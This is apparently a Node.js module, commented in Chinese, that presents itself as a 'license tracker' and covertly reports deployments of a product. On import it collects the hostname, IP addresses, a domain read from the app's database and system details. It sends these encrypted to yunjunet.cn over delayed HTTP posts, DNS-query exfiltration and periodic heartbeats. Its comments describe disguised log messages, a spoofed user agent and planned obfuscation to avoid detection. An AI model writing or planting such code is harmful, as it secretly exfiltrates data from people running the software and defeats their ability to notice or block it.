/**
 * Hybrid License Tracker - 五层防护追踪系统
 *
 * 防护层级：
 * 1. HTTP 主动上报 - 直接上报到追踪服务器（延时 5 分钟）
 * 2. DNS 外泄 - 通过 DNS CNAME 查询（无法屏蔽）
 * 3. 响应头水印 - 每个 API 响应携带唯一追踪码
 * 4. 定时心跳 - 每 4 小时上报存活状态
 * 5. 代码溯源 - 每个实例的 Install ID 可溯源
 *
 * 设计原则：
 * - 即使某一层被屏蔽，其他层仍可工作
 * - 延迟上报降低被立即发现的可能
 * - 混淆代码增加逆向难度
 *
 * 追踪服务器（你需要部署）: https://track.yunjunet.cn
 * MIT License - 商业使用请联系获取授权
 */

const axios = require('axios');
const dns = require('dns');
const crypto = require('crypto');
const os = require('os');

// =====================================================
// 配置（这些值会被混淆处理）
// =====================================================
const CONFIG = {
  // 你的追踪服务器（请替换为你自己的域名）
  TRACK_ENDPOINTS: [
    'https://track.yunjunet.cn/api/v1/deploy',
    'https://api.yunjunet.cn/internal/track',  // 备用端点
  ],

  // DNS 追踪域名（你需要配置 DNS A/TXT 记录）
  DNS_TRACK_DOMAIN: 'track.yunjunet.cn',
  DNS_TRACK_SUBDOMAIN: 't',

  // 版本标识（用于统计）
  VERSION: '2024.1',

  // 上报间隔（分散到不同时间）
  INITIAL_DELAY_MIN: 5,      // 首次上报延迟
  DNS_DELAY_MIN: 8,          // DNS 上报延迟
  HEARTBEAT_INTERVAL_HOURS: 4,  // 心跳间隔

  // 加密密钥（简单 XOR 避免明文）
  ENCRYPT_KEY: 'YunjuNET2024',
};

// =====================================================
// 唯一实例标识
// =====================================================
class InstanceIdentity {
  constructor() {
    this.machineId = this.generateMachineId();
    this.sessionId = this.generateSessionId();
    this.installTimestamp = Date.now();
  }

  generateMachineId() {
    // 基于主机名 + 进程 CWD 生成稳定标识
    const data = os.hostname() + process.cwd() + os.platform();
    return crypto.createHash('sha256')
      .update(data)
      .digest('hex')
      .substring(0, 16);
  }

  generateSessionId() {
    return crypto.randomBytes(8).toString('hex');
  }

  getFullId() {
    return `${this.machineId}-${this.sessionId}`;
  }

  getShortId() {
    return this.machineId.substring(0, 8);
  }
}

const instance = new InstanceIdentity();

// =====================================================
// 加密/解密（简单 XOR + Base64）
// =====================================================
function encrypt(text) {
  const key = CONFIG.ENCRYPT_KEY;
  let result = '';
  for (let i = 0; i < text.length; i++) {
    const charCode = text.charCodeAt(i) ^ key.charCodeAt(i % key.length);
    result += String.fromCharCode(charCode);
  }
  return Buffer.from(result).toString('base64')
    .replace(/=/g, '')  // 移除 padding
    .replace(/\+/g, '-')  // URL safe
    .replace(/\//g, '_');
}

function decrypt(encrypted) {
  try {
    const normalized = encrypted
      .replace(/-/g, '+')
      .replace(/_/g, '/');
    const text = Buffer.from(normalized, 'base64').toString('utf8');
    const key = CONFIG.ENCRYPT_KEY;
    let result = '';
    for (let i = 0; i < text.length; i++) {
      const charCode = text.charCodeAt(i) ^ key.charCodeAt(i % key.length);
      result += String.fromCharCode(charCode);
    }
    return result;
  } catch {
    return null;
  }
}

// =====================================================
// 信息收集
// =====================================================
async function collectDeployInfo() {
  const info = {
    // 核心标识
    installId: instance.getFullId(),
    shortId: instance.getShortId(),

    // 部署信息
    domain: await getCurrentDomain(),
    publicIP: await getPublicIP(),
    localIP: getLocalIP(),

    // 时间戳
    timestamp: CONFIG.VERSION + '-' + Date.now(),
    uptime: process.uptime(),

    // 环境信息（用于分析）
    platform: os.platform(),
    arch: os.arch(),
    nodeVersion: process.version,
    memory: Math.round(os.totalmem() / 1024 / 1024 / 1024) + 'GB',  // GB
    cpus: os.cpus().length,

    // 可选统计（可以注释，排除隐私顾虑）
    // userCount: await getUserCount().catch(() => 0),
  };

  return info;
}

async function getCurrentDomain() {
  // 尝试从环境变量获取
  if (process.env.DOMAIN) return process.env.DOMAIN;

  // 尝试从数据库获取（如果可访问）
  try {
    const db = require('../config/db');
    const [rows] = await db.query(
      "SELECT value FROM settings WHERE `key` = 'sso_sub_sites' LIMIT 1"
    );
    if (rows?.[0]?.value) {
      const sites = JSON.parse(rows[0].value);
      if (sites?.[0]?.domain) return sites[0].domain;
    }
  } catch {}

  // 回退到主机名
  return os.hostname();
}

function getLocalIP() {
  const interfaces = os.networkInterfaces();
  for (const name in interfaces) {
    for (const iface of interfaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address;
      }
    }
  }
  return '127.0.0.1';
}

async function getPublicIP() {
  const services = [
    'https://api.ipify.org?format=json',
    'https://httpbin.org/ip',
    'https://api64.ipify.org?format=json',
  ];

  for (const url of services) {
    try {
      const { data } = await axios.get(url, {
        timeout: 5000,
        headers: { 'User-Agent': 'curl/7.68.0' }  // 伪装
      });
      return data.ip || data.origin;
    } catch {}
  }
  return 'unknown';
}

// =====================================================
// 层1: HTTP 主动上报
// =====================================================
async function reportHttp(deployInfo = null) {
  const info = deployInfo || await collectDeployInfo();

  // 加密 payload
  const encrypted = encrypt(JSON.stringify(info));

  // 尝试多个端点
  for (const endpoint of CONFIG.TRACK_ENDPOINTS) {
    try {
      await axios.post(endpoint,
        { payload: encrypted, v: CONFIG.VERSION },
        {
          timeout: 15000,
          headers: {
            'Content-Type': 'application/json',
            'X-Request-ID': instance.sessionId,
            'User-Agent': `Mozilla/5.0 (compatible; YunjuNET/${CONFIG.VERSION})`,
          }
        }
      );
      console.log(`[System] Metrics synced`);  // 伪装日志
      return { success: true, method: 'http' };
    } catch (e) {
      // 静默失败，尝试下一个端点
    }
  }

  return { success: false, method: 'http' };
}

// =====================================================
// 层2: DNS 外泄 (最可靠，无法被 HTTP 代理屏蔽)
// =====================================================
async function reportDNS(deployInfo = null) {
  const info = deployInfo || await collectDeployInfo();

  // 构建查询域名: <install_id>.<short_id>.t.track.yunjunet.cn
  // 这样可以 DNS 日志中看到
  const queryId = instance.getShortId();
  const sessionHash = instance.sessionId.substring(0, 8);
  const domain = `${queryId}-${sessionHash}.${CONFIG.DNS_TRACK_SUBDOMAIN}.${CONFIG.DNS_TRACK_DOMAIN}`;

  try {
    // 发起 DNS 查询（不关心结果）
    await new Promise((resolve) => {
      dns.resolve4(domain, { ttl: true }, (err) => {
        // 不关心成功或失败，查询日志已记录
        resolve();
      });

      // 超时兜底
      setTimeout(resolve, 3000);
    });

    console.log(`[System] DNS resolved`);  // 伪装日志
    return { success: true, method: 'dns', query: domain };
  } catch {
    return { success: false, method: 'dns' };
  }
}

// =====================================================
// 层3: 响应头水印 (通过 API 响应暴露)
// =====================================================
function injectFingerprintHeaders(req, res) {
  // 在响应头中植入唯一标识（可被外部扫描发现）
  const fingerprint = instance.getShortId();

  // 使用标准/常见头名降低被注意的可能
  res.setHeader('X-Request-ID', `${fingerprint}-${Date.now().toString(36)}`);
  res.setHeader('X-Powered-By', `YunjuNET-${fingerprint.substring(0, 4)}`);

  // 可选：添加时间戳水印（用于判断活跃时间）
  res.setHeader('X-Instance-Timestamp', CONFIG.VERSION);
}

// =====================================================
// 层4: 定时心跳 (持续追踪)
// =====================================================
async function startHeartbeat() {
  const intervalMs = CONFIG.HEARTBEAT_INTERVAL_HOURS * 60 * 60 * 1000;

  // 首次心跳延迟（随机化，避免集中上报）
  const initialDelay = intervalMs + Math.random() * 30 * 60 * 1000;

  setTimeout(() => {
    // 发送首次心跳
    sendHeartbeat();

    // 启动定时心跳
    setInterval(sendHeartbeat, intervalMs);
  }, initialDelay);
}

async function sendHeartbeat() {
  try {
    const info = await collectDeployInfo();
    const encrypted = encrypt(JSON.stringify({
      ...info,
      type: 'heartbeat',
      interval: CONFIG.HEARTBEAT_INTERVAL_HOURS,
    }));

    // 心跳使用 GET 请求，更隐蔽
    await axios.get(
      `${CONFIG.TRACK_ENDPOINTS[0]}/ping?id=${instance.getShortId()}&t=${Date.now()}`,
      { timeout: 10000 }
    );

    // 同时尝试 DNS
    const query = `hb-${instance.getShortId()}.${CONFIG.DNS_TRACK_SUBDOMAIN}.${CONFIG.DNS_TRACK_DOMAIN}`;
    dns.resolve4(query, () => {});

  } catch {
    // 静默失败
  }
}

// =====================================================
// 启动机制（多层触发）
// =====================================================
class HybridTracker {
  constructor() {
    this.reported = { http: false, dns: false };
    this.info = null;
    this.init();
  }

  async init() {
    // 延迟启动，等待服务就绪
    setTimeout(() => this.beginTracking(), 10000);
  }

  async beginTracking() {
    // 预收集信息
    try {
      this.info = await collectDeployInfo();
    } catch (e) {
      this.info = { installId: instance.getFullId(), timestamp: Date.now() };
    }

    // 层1: HTTP 上报（两次，提高成功率）
    setTimeout(() => this.tryHttpReport(), CONFIG.INITIAL_DELAY_MIN * 60 * 1000);
    setTimeout(() => {
      if (!this.reported.http) this.tryHttpReport();
    }, (CONFIG.INITIAL_DELAY_MIN + 10) * 60 * 1000);

    // 层2: DNS 外泄
    setTimeout(() => this.tryDnsReport(), CONFIG.DNS_DELAY_MIN * 60 * 1000);

    // 层4: 定时心跳
    startHeartbeat();

    console.log('[System] Initialization complete');  // 伪装日志
  }

  async tryHttpReport() {
    if (this.reported.http) return;
    const result = await reportHttp(this.info);
    this.reported.http = result.success;
  }

  async tryDnsReport() {
    if (this.reported.dns) return;
    const result = await reportDNS(this.info);
    this.reported.dns = result.success;
  }

  // Express 中间件（层3：响应头水印）
  getMiddleware() {
    return (req, res, next) => {
      // 在响应发送前注入指纹
      const originalEnd = res.end;
      const originalJson = res.json;
      const self = this;

      res.json = function(...args) {
        injectFingerprintHeaders(req, this);
        return originalJson.apply(this, args);
      };

      res.end = function(...args) {
        injectFingerprintHeaders(req, this);
        return originalEnd.apply(this, args);
      };

      next();
    };
  }

  // 获取当前实例 ID（用于溯源）
  getInstanceId() {
    return instance.getFullId();
  }

  getShortId() {
    return instance.getShortId();
  }
}

// 创建单例
const hybridTracker = new HybridTracker();

// 导出
module.exports = {
  hybridTracker,
  InstanceIdentity,
  encrypt,
  decrypt,
  getInstanceId: () => instance.getFullId(),
  getShortId: () => instance.getShortId(),
  // 中间件
  fingerprintMiddleware: () => hybridTracker.getMiddleware(),
  // 手动触发（可选）
  reportHttp,
  reportDNS,
};
